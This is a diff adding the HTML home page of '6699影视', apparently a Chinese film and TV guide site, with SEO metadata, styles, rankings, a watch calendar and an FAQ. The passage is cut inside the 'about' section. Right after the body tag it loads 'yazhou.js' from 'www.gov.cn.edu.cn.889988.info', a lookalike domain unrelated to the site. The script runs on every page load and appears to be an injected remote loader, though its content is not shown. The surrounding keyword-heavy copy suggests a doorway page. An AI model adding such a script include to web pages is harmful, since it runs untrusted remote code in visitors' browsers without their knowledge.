@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="format-detection" content="telephone=no">
+<title>6699影视｜高清电影热剧选片导航与追剧日历_6699yingshi-app</title>
+<meta name="keywords" content="6699影视,6699yingshi-app,6699影视官网,在线影视选片,高清电影推荐清单,热播剧集排行榜,影视分类导航,追剧更新时间表,影视看点评测,经典电影片单,动漫综艺索引,影视信息检索">
+<meta name="description" content="6699影视（6699yingshi-app.github.io）是面向影视爱好者的选片导航站：按题材梳理动作、科幻、悬疑、动画等 12 类片库，每日更新热播榜与追剧日历，附影片看点、评分口碑与观看建议，帮你三分钟挑到今晚想看的那部。">
+<meta name="author" content="6699影视">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1">
+<meta name="theme-color" content="#0b0f16">
+<meta name="baidu-site-verification" content="6699yingshi-app">
+<meta name="msvalidate.01" content="6699yingshi-app-github-io">
+<link rel="canonical" href="https://6699yingshi-app.github.io/">
+<link rel="alternate" hreflang="zh-CN" href="https://6699yingshi-app.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="6699影视">
+<meta property="og:title" content="6699影视｜高清电影热剧选片导航与追剧日历">
+<meta property="og:description" content="6699影视收录动作、科幻、悬疑、动画等 12 类影视条目，每日刷新热播榜与追剧日历，看点、口碑、观看建议一次看全。">
+<meta property="og:url" content="https://6699yingshi-app.github.io/">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="6699影视｜高清电影热剧选片导航与追剧日历">
+<meta name="twitter:description" content="今晚看什么？6699影视用分类导航、热播榜和追剧日历给你一个答案。">
+<style>
+:root{
+  --ink:#0b0f16;
+  --ink2:#121826;
+  --ink3:#1a2233;
+  --line:#26314a;
+  --txt:#e8eef8;
+  --dim:#93a1bb;
+  --gold:#ffc247;
+  --wine:#ff5c72;
+  --mint:#4ee0b0;
+  --r:14px;
+  --wrap:1180px;
+}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{
+  margin:0;background:var(--ink);color:var(--txt);
+  font:16px/1.75 "PingFang SC","Hiragino Sans GB","Microsoft YaHei",system-ui,-apple-system,"Segoe UI",sans-serif;
+  overflow-x:hidden;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+h1,h2,h3,h4{margin:0;line-height:1.25;font-weight:800;letter-spacing:.5px}
+p{margin:0}
+ul,ol{margin:0;padding:0;list-style:none}
+.wrap{width:100%;max-width:var(--wrap);margin:0 auto;padding:0 20px}
+.sr{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0)}
+
+/* ===== 顶部更新条 ===== */
+.ticker{background:linear-gradient(90deg,#2a1206,#3a1a08,#2a1206);border-bottom:1px solid #4a2a10;overflow:hidden;height:34px;position:relative}
+.ticker-track{display:flex;align-items:center;height:34px;white-space:nowrap;animation:slide 26s linear infinite;font-size:13px;color:#ffd791;letter-spacing:1px}
+.ticker-track span{padding:0 26px}
+.ticker-track b{color:var(--gold)}
+@keyframes slide{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
+
+/* ===== 头部 ===== */
+.top{position:sticky;top:0;z-index:60;background:rgba(11,15,22,.94);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.top-in{display:flex;align-items:center;justify-content:space-between;gap:14px;height:66px}
+.brand{display:flex;align-items:center;gap:12px;min-width:0}
+.logo{
+  width:42px;height:42px;border-radius:10px;flex:0 0 auto;position:relative;
+  background:var(--gold);overflow:hidden;box-shadow:0 6px 18px rgba(255,194,71,.28);
+}
+.logo::before,.logo::after{
+  content:"";position:absolute;left:0;right:0;height:7px;
+  background:repeating-linear-gradient(90deg,var(--ink) 0 5px,transparent 5px 12px);
+}
+.logo::before{top:4px}
+.logo::after{bottom:4px}
+.logo i{position:absolute;inset:14px 5px;background:var(--ink);border-radius:2px;font-style:normal;color:var(--gold);font-size:13px;font-weight:900;display:flex;align-items:center;justify-content:center;letter-spacing:-.5px}
+.brand-txt{min-width:0}
+.brand-txt strong{display:block;font-size:20px;letter-spacing:2px;white-space:nowrap}
+.brand-txt em{display:block;font-style:normal;font-size:11.5px;color:var(--dim);letter-spacing:.6px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.nav{display:flex;align-items:center;gap:4px}
+.nav a{font-size:14.5px;color:#c6d2e6;padding:8px 12px;border-radius:9px;white-space:nowrap;transition:.2s}
+.nav a:hover,.nav a.on{color:var(--ink);background:var(--gold);font-weight:700}
+.burger{display:none;width:42px;height:38px;border:1px solid var(--line);border-radius:9px;background:var(--ink2);cursor:pointer;padding:0}
+.burger span{display:block;width:18px;height:2px;background:var(--txt);margin:4px auto;border-radius:2px}
+
+/* ===== 首屏 ===== */
+.hero{position:relative;padding:64px 0 40px;overflow:hidden}
+.hero::before{content:"";position:absolute;left:-12%;top:-160px;width:640px;height:640px;border-radius:50%;background:radial-gradient(circle,rgba(255,194,71,.16),transparent 62%)}
+.hero::after{content:"";position:absolute;right:-14%;bottom:-220px;width:560px;height:560px;border-radius:50%;background:radial-gradient(circle,rgba(255,92,114,.14),transparent 62%)}
+.hero-in{position:relative;display:grid;grid-template-columns:1.05fr .95fr;gap:44px;align-items:center}
+.hero h1{font-size:clamp(38px,7vw,72px);letter-spacing:1px}
+.hero h1 .bar{display:inline-block;background:var(--gold);color:var(--ink);padding:2px 14px;transform:skewX(-7deg);border-radius:4px}
+.hero .sub{margin-top:20px;color:#b9c6dc;font-size:clamp(15px,2.1vw,17.5px);max-width:46em}
+.hero .url{margin-top:16px;display:inline-flex;align-items:center;gap:8px;font-size:13px;color:var(--mint);border:1px dashed #2b6d5a;background:rgba(78,224,176,.07);padding:7px 13px;border-radius:999px;word-break:break-all}
+.hero .url::before{content:"";width:7px;height:7px;border-radius:50%;background:var(--mint);flex:0 0 auto}
+.btns{margin-top:28px;display:flex;flex-wrap:wrap;gap:12px}
+.btn{padding:13px 26px;border-radius:11px;font-weight:700;font-size:15px;border:1px solid transparent;transition:.2s}
+.btn-a{background:var(--gold);color:#1a1204}
+.btn-b{background:transparent;color:var(--txt);border-color:var(--line)}
+.btn:hover{transform:translateY(-2px)}
+.btn-a:hover{box-shadow:0 10px 24px rgba(255,194,71,.25)}
+.btn-b:hover{border-color:var(--gold);color:var(--gold)}
+.poster-wall{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.poster{aspect-ratio:4/5;border-radius:12px;padding:14px;display:flex;flex-direction:column;justify-content:flex-end;position:relative;overflow:hidden;border:1px solid rgba(255,255,255,.08)}
+.poster::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 40%,rgba(0,0,0,.62))}
+.poster b{position:relative;z-index:2;font-size:15px;letter-spacing:1px}
+.poster i{position:relative;z-index:2;font-style:normal;font-size:11.5px;color:rgba(255,255,255,.78);margin-top:4px}
+.poster:nth-child(1){background:linear-gradient(150deg,#3b2b6b,#8b3a5a 60%,#c2543f)}
+.poster:nth-child(2){background:linear-gradient(150deg,#0f4a5c,#1f7a6a 60%,#4ee0b0)}
+.poster:nth-child(3){background:linear-gradient(150deg,#5a1420,#a12a3a 60%,#ffb08a)}
+.poster:nth-child(4){background:linear-gradient(150deg,#1b2440,#374b7a 60%,#8fb6ff)}
+
+/* ===== 数字条 ===== */
+.stat{border-top:1px solid var(--line);border-bottom:1px solid var(--line);background:var(--ink2)}
+.stat-in{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--line)}
+.stat div{background:var(--ink2);padding:20px 12px;text-align:center}
+.stat b{display:block;font-size:clamp(22px,3.4vw,30px);color:var(--gold);letter-spacing:1px}
+.stat span{font-size:12.5px;color:var(--dim);letter-spacing:1px}
+
+/* ===== 通用区块 ===== */
+section{padding:60px 0 8px}
+.hd{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:26px;flex-wrap:wrap}
+.hd h2{font-size:clamp(23px,3.6vw,32px)}
+.hd h2 em{font-style:normal;color:var(--gold)}
+.hd p{font-size:13.5px;color:var(--dim);max-width:34em;margin-top:8px}
+.hd .more{font-size:13px;color:var(--dim);border:1px solid var(--line);padding:7px 14px;border-radius:999px;white-space:nowrap}
+.hd .more:hover{border-color:var(--gold);color:var(--gold)}
+.kw{color:var(--gold);font-weight:700}
+
+/* ===== 片单横滑 ===== */
+.rail{display:flex;gap:16px;overflow-x:auto;scroll-snap-type:x mandatory;padding:4px 20px 22px;margin:0 -20px;-webkit-overflow-scrolling:touch;scrollbar-width:thin}
+.rail::-webkit-scrollbar{height:6px}
+.rail::-webkit-scrollbar-thumb{background:var(--line);border-radius:6px}
+.card{flex:0 0 232px;scroll-snap-align:start;background:var(--ink2);border:1px solid var(--line);border-radius:var(--r);overflow:hidden;transition:.25s}
+.card:hover{transform:translateY(-6px);border-color:#3d4d70}
+.pic{aspect-ratio:3/4;position:relative}
+.pic span{position:absolute;left:10px;top:10px;background:rgba(11,15,22,.82);border:1px solid var(--line);color:var(--gold);font-size:11.5px;padding:3px 9px;border-radius:999px;letter-spacing:.5px}
+.pic em{position:absolute;right:10px;bottom:10px;font-style:normal;font-size:12px;font-weight:800;color:#0b0f16;background:var(--gold);padding:3px 8px;border-radius:6px}
+.card .body{padding:13px 14px 16px}
+.card h3{font-size:15.5px;letter-spacing:.5px}
+.card .meta{font-size:12px;color:var(--dim);margin-top:5px}
+.card .note{font-size:13px;color:#b3c0d6;margin-top:9px;border-left:2px solid var(--wine);padding-left:9px}
+.star{color:var(--gold);letter-spacing:2px;font-size:12.5px}
+
+/* ===== 排行榜 ===== */
+.rank{display:grid;grid-template-columns:1fr 1fr;gap:14px 34px}
+.rank li{display:flex;align-items:center;gap:14px;padding:13px 0;border-bottom:1px dashed #222c42}
+.rank .no{font-size:26px;font-weight:900;color:#313d59;width:38px;flex:0 0 auto;text-align:center;font-style:italic}
+.rank li:nth-child(-n+3) .no{color:var(--wine)}
+.rank .txt{flex:1;min-width:0}
+.rank .txt h3{font-size:15px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.rank .txt p{font-size:12.5px;color:var(--dim);margin-top:3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.rank .heat{flex:0 0 96px;height:7px;border-radius:99px;background:#1c2436;overflow:hidden}
+.rank .heat i{display:block;height:100%;background:linear-gradient(90deg,var(--wine),var(--gold))}
+
+/* ===== 分类磁贴 ===== */
+.tags{display:grid;grid-template-columns:repeat(4,1fr);grid-auto-rows:96px;gap:12px}
+.tag{border:1px solid var(--line);border-radius:var(--r);background:var(--ink2);padding:14px;display:flex;flex-direction:column;justify-content:space-between;transition:.25s;position:relative;overflow:hidden}
+.tag:hover{border-color:var(--gold);background:#161d2c}
+.tag b{font-size:18px;letter-spacing:1px}
+.tag i{font-style:normal;font-size:12px;color:var(--dim)}
+.tag .n{position:absolute;right:12px;top:10px;font-size:12px;color:#4c5a77}
+.tag.big{grid-column:span 2;grid-row:span 2}
+.tag.big b{font-size:26px}
+.tag.wide{grid-column:span 2}
+.tag.a{background:linear-gradient(140deg,#2a1a3d,#121826 70%)}
+.tag.b{background:linear-gradient(140deg,#12333a,#121826 70%)}
+.tag.c{background:linear-gradient(140deg,#3a1622,#121826 70%)}
+
+/* ===== 追剧日历 ===== */
+.cal{display:grid;grid-template-columns:repeat(7,1fr);gap:10px}
+.day{background:var(--ink2);border:1px solid var(--line);border-radius:12px;padding:12px 11px;min-height:150px;display:flex;flex-direction:column;gap:9px}
+.day.today{border-color:var(--gold);box-shadow:inset 0 0 0 1px rgba(255,194,71,.35)}
+.day h4{font-size:13px;color:var(--gold);letter-spacing:1px;display:flex;justify-content:space-between}
+.day h4 s{text-decoration:none;color:#4c5a77;font-size:11px}
+.day a{font-size:12.8px;color:#c3cfe3;line-height:1.55;padding:7px 9px;background:#0e1420;border-radius:8px;border-left:2px solid #2f3b56}
+.day a:hover{color:var(--gold);border-left-color:var(--gold)}
+
+/* ===== 指南折叠 ===== */
+.guide{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.guide details{background:var(--ink2);border:1px solid var(--line);border-radius:12px;padding:0;overflow:hidden}
+.guide summary{cursor:pointer;padding:16px 18px;font-weight:700;font-size:15.5px;list-style:none;display:flex;justify-content:space-between;align-items:center;gap:10px}
+.guide summary::-webkit-details-marker{display:none}
+.guide summary::after{content:"+";color:var(--gold);font-size:20px;font-weight:900}
+.guide details[open] summary::after{content:"−"}
+.guide details[open] summary{color:var(--gold)}
+.guide .ans{padding:0 18px 18px;font-size:14px;color:#b3c0d6;border-top:1px solid #1e2739;padding-top:14px}
+
+/* ===== 关于 ===== */
+.about{display:grid;grid-template-columns:1.15fr .85fr;gap:30px;align-items:start}
+.about .txt p{color:#b3c0d6;font-size:15px;margin-bottom:14px}
+.panel{background:var(--ink2);border:1px solid var(--line);border-radius:var(--r);padding:22px}
+.panel h3{font-size:17px;margin-bottom:14px}
+.panel .site{font-size:15px;color:var(--gold);word-break:break-all;line-height:1.9}
+.panel ul{margin-top:12px;border-top:1px solid #1e2739}
+.panel ul li{border-bottom:1px solid #1a2233}
+.panel ul a{display:flex;justify-content:space-between;font-size:13.8px;color:#c3cfe3;padding:10px 2px}
+.panel ul a span{color:#4c5a77;font-size:12px}
+.panel ul a:hover{color:var(--gold)}
+
+/* ===== 页脚 ===== */
+footer{margin-top:60px;background:#080b12;border-top:1px solid var(--line);padding:44px 0 30px}
+.f-in{display:grid;grid-template-columns:1.2fr .8fr .8fr;gap:26px}
+.f-col h4{font-size:14.5px;color:var(--gold);margin-bottom:12px;letter-spacing:1px}
+.f-col p,.f-col a{font-size:13.5px;color:var(--dim);line-height:2.1}
+.f-col a:hover{color:var(--txt)}
+.f-bot{margin-top:30px;padding-top:20px;border-top:1px solid #141b28;font-size:12.5px;color:#6d7c98;display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap}
+.f-bot b{color:#93a1bb;font-weight:600}
+
+/* ===== 响应式 ===== */
+@media (max-width:980px){
+  .hero-in{grid-template-columns:1fr;gap:30px}
+  .poster-wall{grid-template-columns:repeat(4,1fr)}
+  .poster{aspect-ratio:3/4}
+  .about{grid-template-columns:1fr}
+  .f-in{grid-template-columns:1fr 1fr}
+}
+@media (max-width:760px){
+  .nav{display:none;position:absolute;left:0;right:0;top:66px;background:#0d121c;border-bottom:1px solid var(--line);flex-direction:column;align-items:stretch;padding:8px 14px 16px;gap:2px}
+  .nav.open{display:flex}
+  .nav a{padding:12px 10px;font-size:15px;border-radius:8px}
+  .burger{display:block}
+  .hero{padding:40px 0 26px}
+  .stat-in{grid-template-columns:1fr 1fr}
+  .rank{grid-template-columns:1fr}
+  .tags{grid-template-columns:1fr 1fr;grid-auto-rows:88px}
+  .tag.big{grid-column:span 2;grid-row:span 1}
+  .tag.wide{grid-column:span 1}
+  .cal{grid-template-columns:1fr 1fr;gap:8px}
+  .day{min-height:auto}
+  .guide{grid-template-columns:1fr}
+  .f-in{grid-template-columns:1fr}
+  .card{flex:0 0 78%}
+  section{padding:44px 0 4px}
+}
+@media (prefers-reduced-motion:reduce){
+  *{animation:none!important;transition:none!important}
+  html{scroll-behavior:auto}
+}
+</style>
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@graph":[
+    {
+      "@type":"WebSite",
+      "@id":"https://6699yingshi-app.github.io/#website",
+      "url":"https://6699yingshi-app.github.io/",
+      "name":"6699影视",
+      "alternateName":"6699yingshi-app 影视导航",
+      "description":"6699影视提供高清电影、热播剧集、综艺动漫的分类导航、热播榜单与追剧日历，附影片看点、口碑评分与观看建议。",
+      "inLanguage":"zh-CN",
+      "publisher":{"@id":"https://6699yingshi-app.github.io/#org"}
+    },
+    {
+      "@type":"Organization",
+      "@id":"https://6699yingshi-app.github.io/#org",
+      "name":"6699影视",
+      "url":"https://6699yingshi-app.github.io/",
+      "slogan":"今晚看什么，先上 6699影视",
+      "description":"6699影视是以影视信息索引与选片参考为主的导航站点，不存储任何音视频文件。"
+    },
+    {
+      "@type":"CollectionPage",
+      "@id":"https://6699yingshi-app.github.io/#page",
+      "url":"https://6699yingshi-app.github.io/",
+      "name":"6699影视·今日片单与热播榜",
+      "isPartOf":{"@id":"https://6699yingshi-app.github.io/#website"},
+      "about":"影视分类、热播排行、追剧日历与观影指南"
+    },
+    {
+      "@type":"FAQPage",
+      "mainEntity":[
+        {"@type":"Question","name":"6699影视收录哪些类型的影视条目？","acceptedAnswer":{"@type":"Answer","text":"目前分为动作、科幻、悬疑、喜剧、爱情、动画、纪录片、武侠、都市、历史、恐怖、短剧共 12 个分类，每类按热度与口碑双向排序。"}},
+        {"@type":"Question","name":"6699影视的榜单多久更新一次？","acceptedAnswer":{"@type":"Answer","text":"热播榜每日刷新一次，追剧日历按周更新，遇到档期变化会在当日补更。"}},
+        {"@type":"Question","name":"在 6699影视上找片需要付费吗？","acceptedAnswer":{"@type":"Answer","text":"6699影视的检索、榜单与看点信息全部免费开放，不做任何收费引导。"}},
+        {"@type":"Question","name":"6699影视是否提供片源下载？","acceptedAnswer":{"@type":"Answer","text":"本站仅做影视信息索引与观影视点整理，不存储、不托管任何音视频文件，观看请前往已取得授权的正规平台。"}}
+      ]
+    }
+  ]
+}
+</script>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+<h1 class="sr">6699影视 - 高清影视选片导航与追剧日历（6699yingshi-app.github.io）</h1>
+
+<div class="ticker" aria-hidden="true">
+  <div class="ticker-track">
+    <span>今日片单已刷新 · <b>6699影视</b> 收录条目 12860+</span>
+    <span>热播榜：<b>悬疑剧</b> 热度上涨 32%</span>
+    <span>追剧日历 · 本周三更新 <b>6 部</b></span>
+    <span>官方入口：<b>https://6699yingshi-app.github.io</b></span>
+    <span>今日片单已刷新 · <b>6699影视</b> 收录条目 12860+</span>
+    <span>热播榜：<b>悬疑剧</b> 热度上涨 32%</span>
+    <span>追剧日历 · 本周三更新 <b>6 部</b></span>
+    <span>官方入口：<b>https://6699yingshi-app.github.io</b></span>
+  </div>
+</div>
+
+<header class="top">
+  <div class="wrap top-in">
+    <a class="brand" href="#" aria-label="6699影视 首页">
+      <span class="logo"><i>6699</i></span>
+      <span class="brand-txt">
+        <strong>6699影视</strong>
+        <em>6699yingshi-app.github.io</em>
+      </span>
+    </a>
+    <nav class="nav" id="nav" aria-label="主导航">
+      <a href="#" data-go="lineup">今日片单</a>
+      <a href="#" data-go="rank">热播榜</a>
+      <a href="#" data-go="cate">分类导航</a>
+      <a href="#" data-go="cal">追剧日历</a>
+      <a href="#" data-go="guide">观影指南</a>
+      <a href="#" data-go="about">关于本站</a>
+    </nav>
+    <button class="burger" id="burger" type="button" aria-label="展开导航菜单" aria-expanded="false">
+      <span></span><span></span><span></span>
+    </button>
+  </div>
+</header>
+
+<main>
+  <section class="hero">
+    <div class="wrap hero-in">
+      <div>
+        <h1><span class="bar">6699影视</span><br>今晚看什么<br>先来这里翻一翻</h1>
+        <p class="sub">6699影视不做资源站，只做一件事：把散落在各处的影视信息按题材、口碑、更新节奏重新排一遍。动作、科幻、悬疑、动画十二个分类，配上每日热播榜和整周追剧日历，挑片这件事基本三分钟能解决。</p>
+        <p class="url">https://6699yingshi-app.github.io</p>
+        <div class="btns">
+          <a class="btn btn-a" href="#" data-go="lineup">看看今日片单</a>
+          <a class="btn btn-b" href="#" data-go="cate">按分类找片</a>
+        </div>
+      </div>
+      <div class="poster-wall" aria-hidden="true">
+        <div class="poster"><b>星际穿越</b><i>科幻 · 2014</i></div>
+        <div class="poster"><b>海边的曼彻斯特</b><i>剧情 · 2016</i></div>
+        <div class="poster"><b>疯狂动物城</b><i>动画 · 2016</i></div>
+        <div class="poster"><b>无间道</b><i>犯罪 · 2002</i></div>
+      </div>
+    </div>
+  </section>
+
+  <div class="stat">
+    <div class="wrap stat-in">
+      <div><b>12860+</b><span>在库影视条目</span></div>
+      <div><b>12</b><span>题材分类</span></div>
+      <div><b>210</b><span>日均新增条目</span></div>
+      <div><b>365</b><span>全年无休更新</span></div>
+    </div>
+  </div>
+
+  <section id="lineup">
+    <div class="wrap">
+      <div class="hd">
+        <div>
+          <h2>今日片单 · <em>6699影视</em> 编辑部挑的</h2>
+          <p>每天上午十点换一批，标准只有两个：值得看，以及现在就能看懂。左右滑动看更多。</p>
+        </div>
+        <a class="more" href="#">全部片单</a>
+      </div>
+      <ul class="rail">
+        <li class="card">
+          <div class="pic" style="background:linear-gradient(160deg,#3a2350,#8a3f6b 55%,#d2685f)"><span>科幻</span><em>9.1</em></div>
+          <div class="body">
+            <h3>沙丘 · 香料之争</h3>
+            <p class="meta">科幻 / 2024 / 166 分钟</p>
+            <p class="star">★★★★★</p>
+            <p class="note">大场面之外，更难得的是把权力与预言的纠缠拍出了压抑感。</p>
+          </div>
+        </li>
+        <li class="card">
+          <div class="pic" style="background:linear-gradient(160deg,#0f3b46,#1f7a6a 55%,#5fe3b4)"><span>悬疑</span><em>8.8</em></div>
+          <div class="body">
+            <h3>雾港疑云</h3>
+            <p class="meta">悬疑 / 2023 / 12 集</p>
+            <p class="star">★★★★☆</p>
+            <p class="note">前四集铺垫略慢，第五集反转之后一口气补完，适合周末连看。</p>
+          </div>
+        </li>
+        <li class="card">
+          <div class="pic" style="background:linear-gradient(160deg,#4a1420,#a12a3a 55%,#ffb08a)"><span>剧情</span><em>9.3</em></div>
+          <div class="body">
+            <h3>肖申克的救赎</h3>
+            <p class="meta">剧情 / 1994 / 142 分钟</p>
+            <p class="star">★★★★★</p>
+            <p class="note">重看第五遍依然会被结尾那场雨打动，老片修复版画质也够用。</p>
+          </div>
+        </li>
+        <li class="card">
+          <div class="pic" style="background:linear-gradient(160deg,#1b2440,#3a5a8c 55%,#a8c8ff)"><span>动画</span><em>8.9</em></div>
+          <div class="body">
+            <h3>千与千寻</h3>
+            <p class="meta">动画 / 2001 / 125 分钟</p>
+            <p class="star">★★★★★</p>
+            <p class="note">带小孩看是冒险故事，一个人看是成长故事，层次很扎实。</p>
+          </div>
+        </li>
+        <li class="card">
+          <div class="pic" style="background:linear-gradient(160deg,#2f2a17,#7a6a24 55%,#e0c257)"><span>喜剧</span><em>8.2</em></div>
+          <div class="body">
+            <h3>午后狂想曲</h3>
+            <p class="meta">喜剧 / 2022 / 104 分钟</p>
+            <p class="star">★★★★☆</p>
+            <p class="note">台词密度高但不吵，适合饭后放松，笑点偏生活流。</p>
+          </div>
+        </li>
+        <li class="card">
+          <div class="pic" style="background:linear-gradient(160deg,#1a2a2a,#2f6b5a 55%,#8fe0c0)"><span>纪录</span><em>9.0</em></div>
+          <div class="body">
+            <h3>蓝色星球 · 深蓝</h3>
+            <p class="meta">纪录片 / 2018 / 60 分钟 × 7</p>
+            <p class="star">★★★★★</p>
+            <p class="note">摄影和配乐都属顶级，压力大时看一集意外地解压。</p>
+          </div>
+        </li>
+      </ul>
+    </div>
+  </section>
+
+  <section id="rank">
+    <div class="wrap">
+      <div class="hd">
+        <div>
+          <h2>热播榜 · 近七日 <em>6699影视</em> 站内检索热度</h2>
+          <p>统计口径为站内搜索、点击与收藏加权，每日零点重算，与播放平台榜单口径不同。</p>
+        </div>
+        <a class="more" href="#">榜单规则</a>
+      </div>
+      <ol class="rank">
+        <li><span class="no">01</span><div class="txt"><h3>雾港疑云 第二季</h3><p>悬疑 · 更新至第 8 集 · 站内检索 41.2 万</p></div><div class="heat"><i style="width:98%"></i></div></li>
+        <li><span class="no">02</span><div class="txt"><h3>沙丘 · 香料之争</h3><p>科幻 · 院线热映 · 站内检索 38.7 万</p></div><div class="heat"><i style="width:93%"></i></div></li>
+        <li><span class="no">03</span><div class="txt"><h3>长夜行</h3><p>犯罪 · 12 集完结 · 站内检索 33.5 万</p></div><div class="heat"><i style="width:86%"></i></div></li>
+        <li><span class="no">04</span><div class="txt"><h3>山城旧事</h3><p>年代 · 更新至第 20 集 · 站内检索 29.8 万</p></div><div class="heat"><i style="width:78%"></i></div></li>
+        <li><span class="no">05</span><div class="txt"><h3>星际穿越</h3><p>科幻 · 经典重映 · 站内检索 26.4 万</p></div><div class="heat"><i style="width:71%"></i></div></li>
+        <li><span class="no">06</span><div class="txt"><h3>午后狂想曲</h3><p>喜剧 · 院线热映 · 站内检索 22.1 万</p></div><div class="heat"><i style="width:64%"></i></div></li>
+        <li><span class="no">07</span><div class="txt"><h3>千与千寻</h3><p>动画 · 经典重映 · 站内检索 19.6 万</p></div><div class="heat"><i style="width:57%"></i></div></li>
+        <li><span class="no">08</span><div class="txt"><h3>蓝色星球 · 深蓝</h3><p>纪录片 · 7 集完结 · 站内检索 16.3 万</p></div><div class="heat"><i style="width:49%"></i></div></li>
+      </ol>
+    </div>
+  </section>
+
+  <section id="cate">
+    <div class="wrap">
+      <div class="hd">
+        <div>
+          <h2>分类导航 · 按题材进 <em>6699影视</em> 片库</h2>
+          <p>每个分类下再按「口碑优先」和「更新优先」两种顺序排，标签后数字为当前在库条目数。</p>
+        </div>
+        <a class="more" href="#">全部分类</a>
+      </div>
+      <div class="tags">
+        <a class="tag big a" href="#"><span class="n">2140</span><b>动作</b><i>枪战 / 格斗 / 谍战</i></a>
+        <a class="tag c" href="#"><span class="n">1860</span><b>科幻</b><i>太空 / 赛博</i></a>
+        <a class="tag b" href="#"><span class="n">1523</span><b>悬疑</b><i>推理 / 刑侦</i></a>
+        <a class="tag" href="#"><span class="n">1420</span><b>喜剧</b><i>生活 / 黑色</i></a>
+        <a class="tag wide b" href="#"><span class="n">1180</span><b>纪录片</b><i>自然 / 人文 / 美食</i></a>
+        <a class="tag" href="#"><span class="n">1065</span><b>爱情</b><i>都市 / 青春</i></a>
+        <a class="tag a" href="#"><span class="n">980</span><b>动画</b><i>剧场版 / 番剧</i></a>
+        <a class="tag c" href="#"><span class="n">742</span><b>恐怖</b><i>惊悚 / 灵异</i></a>
+        <a class="tag" href="#"><span class="n">655</span><b>武侠</b><i>江湖 / 武打</i></a>
+        <a class="tag b" href="#"><span class="n">540</span><b>历史</b><i>正剧 / 人物</i></a>
+        <a class="tag wide a" href="#"><span class="n">430</span><b>短剧</b><i>单集十分钟以内</i></a>
+      </div>
+    </div>
+  </section>
+
+  <section id="cal">
+    <div class="wrap">
+      <div class="hd">
+        <div>
+          <h2>追剧日历 · 本周 <em>6699影视</em> 更新提醒</h2>
+          <p>只列有明确更新安排的剧集，标黄为当天。完结剧不进日历，往分类页找。</p>
+        </div>
+        <a class="more" href="#">订阅更新</a>
+      </div>
+      <div class="cal">
+        <div class="day"><h4>周一 <s>10/26</s></h4><a href="#">长夜行 · 第 11 集</a><a href="#">山城旧事 · 第 21 集</a></div>
+        <div class="day"><h4>周二 <s>10/27</s></h4><a href="#">雾港疑云 2 · 第 9 集</a><a href="#">海边诊所 · 第 4 集</a></div>
+        <div class="day today"><h4>周三 <s>10/28</s></h4><a href="#">雾港疑云 2 · 第 10 集</a><a href="#">旧巷食堂 · 第 6 集</a><a href="#">星轨计划 · 第 2 集</a></div>
+        <div class="day"><h4>周四 <s>10/29</s></h4><a href="#">山城旧事 · 第 22 集</a><a href="#">第七封来信 · 更新</a></div>
+        <div class="day"><h4>周五 <s>10/30</s></h4><a href="#">长夜行 · 第 12 集（完结）</a><a href="#">深夜电台 · 第 3 集</a></div>
+        <div class="day"><h4>周六 <s>10/31</s></h4><a href="#">星轨计划 · 第 3 集</a><a href="#">周末剧场 · 单集特辑</a></div>
+        <div class="day"><h4>周日 <s>11/01</s></h4><a href="#">旧巷食堂 · 第 7 集</a><a href="#">纪录时间 · 新一季</a></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="guide">
+    <div class="wrap">
+      <div class="hd">
+        <div>
+          <h2>观影指南 · 关于 <em>6699影视</em> 的常见疑问</h2>
+          <p>收录规则、更新频率、观看渠道这些问题，这里一次说清。点开看详情。</p>
+        </div>
+        <a class="more" href="#">联系我们</a>
+      </div>
+      <div class="guide">
+        <details open>
+          <summary>6699影视收录哪些类型的影视条目？</summary>
+          <div class="ans">目前分为动作、科幻、悬疑、喜剧、爱情、动画、纪录片、武侠、都市、历史、恐怖、短剧共 12 个分类。每个分类内部支持按口碑评分、上映年份、更新状态三种方式排序，冷门老片和院线新片都会保留。</div>
+        </details>
+        <details>
+          <summary>6699影视的榜单多久更新一次？</summary>
+          <div class="ans">热播榜每日零点重算一次，取站内近七日检索与点击的加权值；追剧日历按周排期，遇到临时改档会在当天补更，条目页会标注「改档」字样。</div>
+        </details>
+        <details>
+          <summary>在 6699影视 上找片需要付费吗？</summary>
+          <div class="ans">不需要。检索、榜单、日历、看点这几块全部免费开放，站内没有任何付费入口，也不会跳转到第三方充值页面。</div>
+        </details>
+        <details>
+          <summary>6699影视 提供片源下载或在线播放吗？</summary>
+          <div class="ans">不提供。6699影视只做影视信息索引与观影视点整理，不存储、不托管任何音视频文件。实际观看请前往已取得授权的正规平台，尊重版权也省得踩坑。</div>
+        </details>
+        <details>
+          <summary>怎么快速找到适合自己的那部？</summary>
+          <div class="ans">先按分类缩小范围，再用「时长」和「评分」两个条件卡一遍：通勤路上筛 20 分钟以内的短剧，周末留两小时就筛 120 分钟以上且评分 8.5 分以上的条目。</div>
+        </details>
+        <details>
+          <summary>发现条目信息有误怎么办？</summary>
+          <div class="ans">条目页底部有纠错入口，提交年份、主演、集数等字段的修正说明即可，一般两个工作日内处理完并回执。</div>
+        </details>
+      </div>
+    </div>
+  </section>
+
+  <section id="about">
+    <div class="wrap about">
+      <div class="txt">
